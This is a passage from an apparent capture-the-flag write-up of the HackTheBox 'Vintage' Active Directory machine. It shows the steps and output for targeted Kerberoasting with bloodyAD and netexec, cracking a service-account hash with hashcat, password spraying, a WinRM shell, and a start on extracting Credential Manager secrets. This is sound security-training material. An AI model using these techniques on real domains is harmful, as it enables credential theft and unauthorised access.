658c989d91212c98ce7c16468764bb82e721cbd5bddf0c518991be41bd03966898c49133ace951827ceb4572451c39f7ec92ed64a52f9db133a7bbce6f78e41fe52e79c656913318b2462ee1504e143c09784474f324f23a12c252cb7d3019ac63c7ac852c091315f1a1005ad857ec69fc01c5a1aebec03d03673961ff3954a171e6be71dfb205f08c79383999d2579528efd02a8bb139593aff275a9baa0d0285923973ea69dcb379f0cd929fe249014ce27e1c505771c8e59223430d1c824c56b5f0896dc5a590db34df54458567fb15577de07c7cc0e020282e749aa006c731945a47aa83d0265836a8aa64e0154ed0348087e665726dd8802d07cc6de91665db6d608d78b9aa756291d1dc03a8e2ff9e87a1b0d0a4221c282ffaa6d9e0b4d10026a8e29ada742bd7f023614cc7ee431fa0686b20c1bb471df9c32c15b8efc98650473654a68aef3bb977348d373a8ad13a85e0c459a90795a21aedd2f2c3259cf5c40e369bf6a34e
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$1d91cfa1fa79c133c26084e264024a12$3ad95abdcab72f5d968a9d798d102781ea85055b6e20e8b416cfd1bb83ca1711fb22b5d2745a03c9a8c208bfb0f55cc683693d2e3e1b3317213d1f63a31d3e2ac5b1b948b27018ed2c3f8362db5ca4cb354dcf5ebc6a97adccf959d68a6e0169556106f4bcc55ef8f66af2e1eebe8d6bcddbec3823c69552f46f9160f3b2cb63d975bdcfdb78cfc8ca315b2fd7c47d5cbd0c3e713042989555e5807944ee0dc81b314ab200d32a38a76f1db7c67dcf970701ad2ec85ad8273771ab4c05ee9ee7eab75a6b09b1469865b43687a5016b2949af7804ae22141e03c4a08da39e895eb35021fae7a62289148283e72e2659691885a4cfa07f2a6289a4f4b53253b608cc1286738569dd5f303c4d0424df53fd25f42a497c12a8bb31288e5e716168e752603ab7400cdc7d0b4dd1873a9936465bb8f0881eb44d70895177e4485382518248e99a77560480b67a3e58f7f209e338a0133b0257acdb5195dae554ed02b26ca5ac63e9df061bc58af80e315adeb822434a0337de731e93c65c75ef7b4aa3abef3699ba931de0ea409d4f8f4170b3a8be9291ba2212df7abcff2f9c9bf14947b04f867dd7e4870ef0a827641839feb8009f17d05b43736050aac9ddcc1af9cb5279bc6e834e624df4aeb7e22e663fb6d89724974e7ffed21bf8c1657b5969c86a21c77c375e06c50ee72b9559fd2ac934a990743aa98b4084226eb83e6ddd221719eb22023affbcba3f8208dc38018448509828289519026391e322129892e05eb3ebcdd3e482ed361f56456f31cadb46f5c4a93d7496a3d7543d04f93d4fd00c81f31b1d5014d87b1604d46e899ae1fd46a385056dc79ab44c95ddd849629d39dc25276cf4a5acfc44626a7f0a2428e7ac4395299e8b512e9842102007a8e87718b3d66c5cb365a73c6df575ce73f3d9a51dd10885552c009ae18b3eb9d58e3af3e49a06dfd4f172efbce9dd859f96fe3f0f3d8118eb7b28698bdbf237bbcdd888f23fd7d83f1f81b53352101478da7bad7d6ae221c8b8b2760c4b3bde80771f34cde585c38897b6c36e9d15e0727089460fe601252541f0cd1d5fc7532a44694b7157de62307acf518b1104ed9b6b2b41d1304ee094573fed53e26795fbec1e4e9aa557bbc27c092a90559732fc2af6a327fdd6efa860e858b1e6203ce706b7f259b63a2920a2f6b3216e3bf9dfa518dd9ace15a592627610b2b2660c2b4b93ce5a1189a531fad11e9a4138539f34751455e0bb4edf4b6a5933b507ba2bf0ec776a741de28185912354638bedf8d03f7137572f1815405f6d01f7e05c429311399c137accb239e543f1e5778aa2067a67c5dcc464c4d84c2d2d6f9d6251cdd4b144b2ee333f9cdedaa50d5717c6db698e7f2262831ea14dfd8011c0d2904c6c19884a4b27aecea9c5ad89faa3c331319a6029b352b945c83c2449a98fd05027df
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$c590ba494c74b86419fe48f79f18490e$f663215c3a4b2f51168dca677cc66a4c6ec8e3ea4258b43b5fb64abcc712236eec8b3f1d08919c18d4d7a27e9e578e6c15512d93b12ca1ae841acb90d5a361240e37ab9d9879170ceac74f00fd7c0ff7c5b3cea91e390b45b1cd4aaf8ac54ab87e9667d7ec82fe8a45671db363e7c9a2eb25d8fd3a589221405cfa68ed9a4c61ad4edd3a5376c59e2de432b0b449bca118b5684d70bea0de7f4a1c60b5d378905f62b98ed326e9b1ea30b869ea3c2975fb9135a0395a8be91d690698683878d062d4438b811a8840c4f285fed81dcb2fe9048dd332aceb28d294d494b28406996ab2b913f81bec2db734c0eed148472b17b421a68f255f6cc019dbceda01730498e05a27c84c30887ec179aa84b3b3fd9e8742272deeeb03b2a40bf96935fbdfa19e6d414864a45987639bc46166dd9e7d8972271eab9899b9373b991fdcf97c7ad3426f3896bb810cbff7a4f4000fad70aab5493a416365bab1bebd874ef9a47278b4a7f6de14872de404caba9d008a6015d95ab4f21e1769551c3557322acc29ed23f1cb1b34d1cc62d431efd905622230d2c1e947dcc7cabbb66aa8e0827318204b28989f3b491e2069e973251c000ed42f9b03eee1c4e5f5167aeaa553b6d31c37462443fec6e98bd0c028091835d9eb971c0e6f5107b7f98e7e6543c9c925366e73b9d5991a0f95dc11f7b47202431f5bcbfd4ff3ff819a45840e5f83da9489432aa9dee90276e2a253bdb0c5267655fd08f23172614345ad9e555ec034f94b32149a1e75405475734113ef4ad82a291b7bb86a40ebb600e33d21dcdcb199d9c93aa159947c1093f4f2b9b2cdff341d92ac3a157b6bbcaccf7421f28462c91da1a4e424184db79b8bc6af870ee528f19f8dacacdacf77e38692c250e789113a24611ab616b43cb18373b68564ff57157e161931c2451b79e41ea6637c5494b80710487759c7fadab1e6cac3d2a71066b2d4eee24608786f2f093e4219a10eb4f770ad584e5e56e197c1b57c7e518d029ec30c6128108d349885221381f84d02ad6325d94c32bdefddc35ee3cbf1d59d5af78783cd9e6f4fdbc8e60be613ecb17078103635d9677a1514a1027373c6ff7938427e63da24da9e3ce9fb0b5d2d5fbde78c788a1baf6c4f6391311adeda4442cd1c947796e337d9cb1bf64b1d5050f2115b3f0066426e8d7858f4ec9ed4c53d45e849e96e378b42aa49637816660cb31743863c2106a79d9e03c2148f982a23cdba779759872f3da5c07ae7b3c56358cf880582fd810e312ea4f57a7562c4d4a7c6d307924ecf732e3855c304dcb97863a5db2ea6a66cba6ea0615fa82cd3a899bb737082bb2bb4c4b54b58dd9a2e0098ba911c54fc5328e5e41ab5248eb46bb5108674d4b1f8b3fc0e5178e5104f23e3b19b7032d1a7187bb04bca1f7a2012defad65cbc557009291f34f19af03a6e

```

I’ll need to have `KRB5CCNAME` pointing to a TGT for the account to use, and then I’ll give it the other options:
- `-d vintage.htb` - the domain to target
- `-k` - use Kerberos auth
- `--no-pass` - don’t prompt for the password (since I’m using the TGT)
- `--dc-host dc01.vintage.htb` - the hostname of the DC.

Leaving off the last arg was what got me stuck originally. At the top of the `init_ldap_session` function on [lines 231-249](https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py#L231-L249) it determines the `target` variable:

```

def init_ldap_session(use_kerberos, use_ldaps, dc_ip, domain, username, password, lmhash, nthash):
    if use_kerberos and not args.dc_host:
        target = get_machine_name(dc_ip, domain)
    else:
        if use_kerberos:
            target = args.dc_host
        else:
            if dc_ip is not None:
                target = args.dc_ip
            else:
                target = domain

```

The `get_machine_name` function tries to use anonymous auth to get the hostname, and in the case of Vintage, fails, returning:

```

oxdf@hacky$ KRB5CCNAME=gmsa01\$.ccache targetedKerberoast.py -d vintage.htb -k --no-pass 
[*] Starting kerberoast attacks
[!] Error while anonymous logging into vintage.htb

```

It’s very confusing because I’m not trying anonymous auth! Once I looked at the code and saw I could bypass that by passing the `--dc-host` arg, it started working.

#### Targeted Kerberoast via bloodyAD / NetExec

To do the targeted Kerberoast with `bloodyAD` and `netexec`, first I need to give the user an SPN. I’ll give each of them one:

```

oxdf@hacky$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 set object svc_ldap servicePrincipalName -v 'http/whateverldap'
[+] svc_ldap's servicePrincipalName has been updated
oxdf@hacky$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 set object svc_ark servicePrincipalName -v 'http/whateverark' 
[+] svc_ark's servicePrincipalName has been updated
oxdf@hacky$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p b3a15bbdfb1c53238d4b50ea2c4d1178 -f rc4 set object svc_ark servicePrincipalName -v 'http/whateversql'
[+] svc_ark's servicePrincipalName has been updated

```

Now I can use `netexec` to get Kerberoastable hashes:

```

oxdf@hacky$ netexec ldap dc01.vintage.htb -u 'GMSA01$' -H b3a15bbdfb1c53238d4b50ea2c4d1178 -k --kerberoasting kerberoasting.hashes
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\GMSA01$:b3a15bbdfb1c53238d4b50ea2c4d1178 
LDAP        dc01.vintage.htb 389    DC01             [*] Skipping disabled account: krbtgt
LDAP        dc01.vintage.htb 389    DC01             [*] Total of records returned 3
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ark, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 13:45:27.913095, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb\svc_ark*$0427f31d168615ed4a4be476a8d7db9c$c4f43c759be0b07efd38721cc7dfbe21bba10c84f6ec1ed3348358dab91f1c9f43d1650bfbcb61ab05ed7252d71268243ee91252d1e12cca2a01af2034361ee23ea4255c1d363ad7d7b6f8420c189a6f28f6a161ee766e6f2968fa8237100b96ca3a54d6ec9ebf67039a6774c9913d4dec7e48624ff061179106074677f1128fe7aef89d2025a6c704bef70e9a7d2f8baec6ae39b2f81ca71836e9456b75d358cf91543fafb356d8234269f4d17d24d0ee41a058424ff9faed03397c54b01d1b641d26545b7213e48be1d1e4f464ba9d2a1220268a62665e0bfdfe77da7f07d2f6fc0eb9c36d210175bb9a634ee32bd32eb74c893505819de68d1775346831df1272e07c2a216e7163b5c8cec58b70c9d6c861f137c7453f1f39ab446c8761b87d185cbb9875bc1532b9f057a2b4b4e8c901aa13f96908dcb2edd9afed56b38b17d221fecb0c8e753807bfa3d4d121c52f2ec4608c238693d328001a23ab07e02545f6c54be491d63c3279a9d8c837e88df50511b7b751e9776b6e8b901d996fc4521b2c37c18c393f9f2ee957cce288a02c9497b74df5192275ecb5357275ffbbed5243af00c6969af7f3c5127d2c76f8970532a552c68a228cdbec9430eb96ad933d6fd46cd531a5e9e043287f5de0e2fb4218abeb050df3421a2322c9db8c03fa9446b73fac9aa9d59b882c74780b814ce4c773890fac2f045d406695967e0673e2d05cda569d24f10cd054462e40f582a357c594487350290a1cbcd9550f50c60ef42be5c2fad1f45e678b74200992fdb29becfb8be29447785be0a60154c7168fae7851a06233c694a977b43919e0bff1e87620ec3fba3c71e929afbee0fc82b03a1c290911e16826f3e6112eda443abe923c41b9f0c24a979b888eda903a926979a6eee97e20a544ce268d4ba074322256993d45807299f9b94bb12bbf12f1e970a83a83d884b856b7d13b76cee6c54ea28cf91c3f5e9bc0f4932a0af5db6abdad55c44a57a6485e1a7894aad7fa4ab359688e3b184d425679dc92cd201c26f14fb5454c39a2de01b2db3529d6d30fedcbd24ad153e3e9057bb4d8de3c94694a577f83e64a12dc196845780e6b21f30624825342c2f1cfdcd2a6a16c9c7a0e6340f40e8347c775f3a22a0e536b137c9ad0a935b04526a488ad7c17be04da3f0234ee5375f0a66fd40a351fa42f8d19bacbdc3e1f094703232c4ce900919d9fee2b459c85804395b97b12dfe24fae806c0432f3e580201167853b780cd8740a4bd67be706b8079be1279ce6fd1e0e546d01ab1920f23673d5d377f803136845ad884a5b0b968df3f08999a9b7e0389fa74be81ce20dac5862ab07e948cadc5d3790a5aea4e21430d9882271261e354de1c0b631df3aab1ebe77bc0836e990f2b64f4afcace274df4474e2709a89a58e71d2bfc49b3a2523b1eb30e346d60b7fef
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_ldap, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-06-06 13:45:27.881830, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb\svc_ldap*$909bc4ee50c19ed086aa068eeb18be1a$3b41c68a1fd9ca4c1f3788929a73e09ef1501fbeeab99b2684766f266c050daf8818ba553914948e7642b4fa47260869bbfc5fa99c9ed85205c861f8054a4ad12eae11288831807b4ccb2dda2ccc83a78969ec71834c13f90c4d603d76675e82d34228ae484d5544c858155ef54f6ca60342c7aec070cd58f74c6aee2f9a84c8b06ab7f7b4bb5e19adef7b5ee77b5c8511cb786cd2e2f5630208498695d960c56a831f5151c76192049f974707485f0e49f91971e0a02f3fe48c9c2ac0bbe3d5288914a7abd88999014745ab599e38983c40b1bc069f4cfe9f00c3226063b8035075fe1bb9036a0a0eb9c6bc0052f9b432047071357cc514de1aacf96d6ee049efc16c22895e75e5a9ed9b9ad3c2dfa7da78d55cffd94978cb35a47a90579368da9b818862426c20d24c0fe8e3b26829ddc24edd83e13d964d06a5f1ad14cec2ca10c6641cb73637fc1db5e0d4e93afd89ac576756a1e82a46c8686b1ebb5a63f890198d53e0284762f99c9e55e1a8b985c413a95d615bc2faff71d2b2d4092c61f4a8746501a38acf75e7213c15247394cbac64c2fbb736f82de54d3d88327b22c40bca42a3d6ee5ec873fff1a9c114b693d42d33364b1441733bf9bbf98cb5bd9436f32093dd6797999778c971cc4179db7f0b7fa3e6d5e81916473f983feb88cbe9dd6a3e0c12797558c3dbb4eb4f6b319593dab9e757bd3fccc5a53956448782c1f7b546889a9f04014b382776877547c9fb24740d9c47bb9a3af985c24c3a861e621a0471c5fda97a080f04d3a233d87bb6eadfa0efb788dc1d7fa80b05d064210425f2be2e9cbd912a04d3ddaedfc060f047ccb271172468c7f3314718dee0a81d50443cc61b6c1b10bb438e158c348b382035c7f51d5123db463e7a381b45612654b6a2cde6aea2ab3f8fb1060126acb8bcc42d555b04e19fe07737815efccead4839cfa739119ad4c7439981f136916a6c3c053ecc1e443894d3b9f24376b6b07d18d95b0170474b4274ef57be2c9b8964aa4f2478f183d40de5a420d41836f69338bc1f9dcea4c85030966527c284c0cd9b5b16b12391c0cacbcccb7691d1d3a26c2228467827af755419d2576d7a8f4f95bb57de2b87b6566b9d60e379545b92caec7aea9c6f5a4ca7a0381c8fd7761d51dd0cfb6a1258c5f4b8c244decb47925b1413913f40666becc90ea6f5f54ffc3ad323fe8cdcd43700456372067594dbbef8fb5ac931fbe4f2605a99739e3802790f39e511768cfe3f5d32f9da514619f870dd082823cf33e13f643410c2ce19d07ec26ed8a573296696bc488d2bf3b4fff92fe384217275f5bd5e878304fc6dadeeba6eeb1ab379b402d7a76f1744f7e26ed7b130ea871b5c24af531eb50cab7dc56e67cd38b86483eafc1fb8a700e0e5c9df62cd5835d19f19d6e86f09f3524e6cf06f1d70e9f9c5aed468d063
LDAP        dc01.vintage.htb 389    DC01             [*] sAMAccountName: svc_sql, memberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb, pwdLastSet: 2024-11-14 18:32:08.499600, lastLogon: <never>
LDAP        dc01.vintage.htb 389    DC01             $krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$997884fbc429c63965035f0b01b5ce1d$381e58d46a0754b124b57c78c3e0dd86c7af5b0738891dffd86b583ff568c6cf0752d8bc292a88febffa3d45a12a687d29c0a9eba276be54f2146c3ee7a07de658ec5dfd0ae0022d190276137d74cceff403f87f10cf4f9d6d46cadd7bfaec52dec8ee92d6066425dc4a947363f2a5216dd7f47f49de39498e4dd44d472d3a421522bff11d1a2ebbcf2edba8d2d37d6c3a31fe880572f030a85de4201efe1f4fff783a82e07aa6d4a5bcf1c714a7bd9285e590ded6712863edf006a44b314ebed4dd5a3bacf985c5ca0c8b27c7d7b91d0200774deffddc062acb8bcfd361741119ef5910f6af91ffc6099dba9f9812f6d1dc73ab7c2b9a99e60101d3f59c6318012d7fae3d6d4ecfb10e123116666470a942aeb59d3201f137fe187bb1a7aa30d2ca597b50bd35e42a048691bdbe80225e6ae9526187f0abe456f78aca7888e1ea8e92b6b3168c3ed3f9188a73ae0ab8f8c898af9fb213f62f3b7d70638d010b58f3ddc72ec1bbf4fff9747b89677594ee92e65cecc6290aa971a13a8af73237c3fb0adaab0d24d97f9d288c8cc6281976e72481fbcb07186d9ba783bc88afe2c7ac8ab50da36ca1c20a123820428268bc15d19a231f981e809e014f31f63cbfb1710db878c265fe972e8df63e0c14f99dc9ff83ed06f2c6d66a2ec5e1ba3d8586672b0694b8e9ed9d5c6cb58fbb1c33b94901a5247e0656091473bf11291a16d11c6ac1b0a7f7ba53519d4daf16062093cb36f30b0dd816d9c9c708762ca075374e7ab20d7bb08c162a73330ccec8abec9c874f77b075635711cf4a7670a16407391d64be54a0fb0d0f18016dff5e0230930df60cb2102863678f5b40451552006b0493432c90971a577de0a9d923dda8c39b6a52ee198b21443fce54eff624b8789b357c6607480ec4244e12c285017093e8d0fed44a6742a4713f413db136f29af1e67646171850e08d3818263bd7ad2576acfa81254a65e575a37cb408b39f52768648b0d1c0b369c9119240f62696f84bdce55177ec0f695de9c97b2210cf83d517af498d32b9670db84cf9bba6d06f480abb7c52c4af797f3f4f87b95feac164ddef788c5b769d1bb57cd90f9983c12b9816f29ba45361fe46ea8978bc2ed2fe3d675bc9c858235e9bf8244f9efa1c50c24f76f1c835d5748b6010a3cdc82cee446270c7affb522bb9cf29b56269c672bece518bfd98c96d586e331d2f9ea20122917584beeb3c400b54f408bb8d6363c9a7f1687977c867bf1334a3b964c5f3967d0f64db5a3e59650d7ed77fce5ade0b9aea1ed50fc7e3de99b5c08627949c7d9ff45c412dcff5f0f6758abf2a3a9ce6647900508f5b98824f7d5882e46aacea5874bf76f1cb7b0916664b84546f7d7a1a372ca628d0dc3a9953cc67410d931cb11b826b662253fe2b8d6b097ce66592de484b809272fddcde4c6f2bd5eb95

```

#### Crack Hash

With three Kerberos challenge / responses in that file, I can attempt to brute force the account passwords with `hashcat`:

```

$ hashcat kerberoasting.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb\svc_sql*$997884fbc429c63965035f0b01b5ce1d$381e58d46a0754b124b57c78c3e0dd86c7af5b0738891dffd86b583ff568c6cf0752d8bc292a88febffa3d45a12a687d29c0a9eba276be54f2146c3ee7a07de658ec5dfd0ae0022d190276137d74cceff403f87f10cf4f9d6d46cadd7bfaec52dec8ee92d6066425dc4a947363f2a5216dd7f47f49de39498e4dd44d472d3a421522bff11d1a2ebbcf2edba8d2d37d6c3a31fe880572f030a85de4201efe1f4fff783a82e07aa6d4a5bcf1c714a7bd9285e590ded6712863edf006a44b314ebed4dd5a3bacf985c5ca0c8b27c7d7b91d0200774deffddc062acb8bcfd361741119ef5910f6af91ffc6099dba9f9812f6d1dc73ab7c2b9a99e60101d3f59c6318012d7fae3d6d4ecfb10e123116666470a942aeb59d3201f137fe187bb1a7aa30d2ca597b50bd35e42a048691bdbe80225e6ae9526187f0abe456f78aca7888e1ea8e92b6b3168c3ed3f9188a73ae0ab8f8c898af9fb213f62f3b7d70638d010b58f3ddc72ec1bbf4fff9747b89677594ee92e65cecc6290aa971a13a8af73237c3fb0adaab0d24d97f9d288c8cc6281976e72481fbcb07186d9ba783bc88afe2c7ac8ab50da36ca1c20a123820428268bc15d19a231f981e809e014f31f63cbfb1710db878c265fe972e8df63e0c14f99dc9ff83ed06f2c6d66a2ec5e1ba3d8586672b0694b8e9ed9d5c6cb58fbb1c33b94901a5247e0656091473bf11291a16d11c6ac1b0a7f7ba53519d4daf16062093cb36f30b0dd816d9c9c708762ca075374e7ab20d7bb08c162a73330ccec8abec9c874f77b075635711cf4a7670a16407391d64be54a0fb0d0f18016dff5e0230930df60cb2102863678f5b40451552006b0493432c90971a577de0a9d923dda8c39b6a52ee198b21443fce54eff624b8789b357c6607480ec4244e12c285017093e8d0fed44a6742a4713f413db136f29af1e67646171850e08d3818263bd7ad2576acfa81254a65e575a37cb408b39f52768648b0d1c0b369c9119240f62696f84bdce55177ec0f695de9c97b2210cf83d517af498d32b9670db84cf9bba6d06f480abb7c52c4af797f3f4f87b95feac164ddef788c5b769d1bb57cd90f9983c12b9816f29ba45361fe46ea8978bc2ed2fe3d675bc9c858235e9bf8244f9efa1c50c24f76f1c835d5748b6010a3cdc82cee446270c7affb522bb9cf29b56269c672bece518bfd98c96d586e331d2f9ea20122917584beeb3c400b54f408bb8d6363c9a7f1687977c867bf1334a3b964c5f3967d0f64db5a3e59650d7ed77fce5ade0b9aea1ed50fc7e3de99b5c08627949c7d9ff45c412dcff5f0f6758abf2a3a9ce6647900508f5b98824f7d5882e46aacea5874bf76f1cb7b0916664b84546f7d7a1a372ca628d0dc3a9953cc67410d931cb11b826b662253fe2b8d6b097ce66592de484b809272fddcde4c6f2bd5eb95:Zer0the0ne
...[snip]...

```

It breaks one of the three accounts - SVC\_SQL has the password “Zer0the0ne”.

#### Validate

I’ll validate that password:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u svc_sql -p 'Zer0the0ne' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne 

```

There is a cleanup script that periodically sets things back, and if I wait too long, I’ll get:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u svc_sql -p 'Zer0the0ne' -k
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                      
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 

```

Re-enabling the account with the same `bloodyAD` command works.

### Password Spray

#### Generate Users List

I would like a list of users. I can do this with `netexec`:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --users
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123 
SMB         dc01.vintage.htb 445    dc01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         dc01.vintage.htb 445    dc01             Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain 
SMB         dc01.vintage.htb 445    dc01             Guest                         2024-11-13 14:16:53 0       Built-in account for guest access to the computer/domain 
SMB         dc01.vintage.htb 445    dc01             krbtgt                        2024-06-05 10:27:35 0       Key Distribution Center Service Account 
SMB         dc01.vintage.htb 445    dc01             M.Rossi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             R.Verdi                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi                     2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             G.Viola                       2024-06-05 13:31:08 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri                        2024-06-05 21:08:13 0        
SMB         dc01.vintage.htb 445    dc01             P.Rosa                        2024-11-06 12:27:16 0        
SMB         dc01.vintage.htb 445    dc01             svc_sql                       2025-04-20 18:32:05 0        
SMB         dc01.vintage.htb 445    dc01             svc_ldap                      2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             svc_ark                       2024-06-06 13:45:27 0        
SMB         dc01.vintage.htb 445    dc01             C.Neri_adm                    2024-06-07 10:54:14 0        
SMB         dc01.vintage.htb 445    dc01             L.Bianchi_adm                 2025-04-18 21:18:40 0        
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated 14 local users: VINTAGE

```

Interestingly, this method doesn’t give the gmsa01$ account (worth being aware of, though it doesn’t bite me here).

I can also get this from the BloodHound data I’ve already collected.

```

oxdf@hacky$ unzip 20250418185542_bloodhound.zip 20250418185542_users.json
Archive:  20250418185542_bloodhound.zip
 extracting: 20250418185542_users.json  
oxdf@hacky$ cat 20250418185542_users.json | jq '.data[].Properties | select(.samaccountname) | .samaccountname' -r 
L.Bianchi_adm
gMSA01$
C.Neri_adm
svc_ark
svc_ldap
svc_sql
P.Rosa
krbtgt
C.Neri
G.Viola
R.Verdi
Administrator
L.Bianchi
Guest
M.Rossi

```

#### Spray

I’ll send that password for svc\_sql to see if it works for any other user. If that password is set manually by some user, it could be the same password they use for their account:

```

oxdf@hacky$ netexec smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\gMSA01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 

```

It actually fails on svc\_sql, though with a different error than the rest, as it is a disabled account. But it worked for C.Neri. C.Neri is a member of the ServiceManagers group, so it makes sense that they have control over these service accounts.

![image-20250420144107377](/img/image-20250420144107377.png)

#### WinRM

They are a member of Remote Management Users as well, which means that they should be able to WinRM. I’ll get a Kerberos session using `kinit`:

```

oxdf@hacky$ kinit c.neri
Password for c.neri@VINTAGE.HTB: 
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri@VINTAGE.HTB

Valid starting       Expires              Service principal
04/20/2025 18:46:57  04/21/2025 04:46:57  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 04/21/2025 18:46:49

```

And use it to connect with `evil-winrm`:

```

oxdf@hacky$ evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> 

```

And grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\C.Neri\desktop> cat user.txt
29f9de83************************

```

## Auth as C.Neri\_adm

### Identify Windows Credentials Manager

The C.Neri account has a credential stored in Windows Credential Manager:

```
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls -force

    Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

```

There is another file in `AppData\Local\Microsoft\Credentials`, but it doesn’t prove helpful here.

The way to see this credential as a user is to run `cmdkey /l`, but it doesn’t work with my Evil-WinRM shell:

```
*Evil-WinRM* PS C:\Users\C.Neri\appdata\local\Microsoft\Credentials> cmdkey /l

Currently stored credentials:
* NONE *

```

The WinRM shell isn’t an interactive session, and doesn’t have access to the key material necessary to access the credential.

### Extract Credential

#### Via RunasCs.exe [Fail]

My first thought is to use [RunasCs.exe](https://github.com/antonioCoco/RunasCs) to get an interactive logon, but it fails:

```
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe -l 2 -d vintage.htb c.neri Zer0the0ne "cmdkey /l"
Program 'RunasCs.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
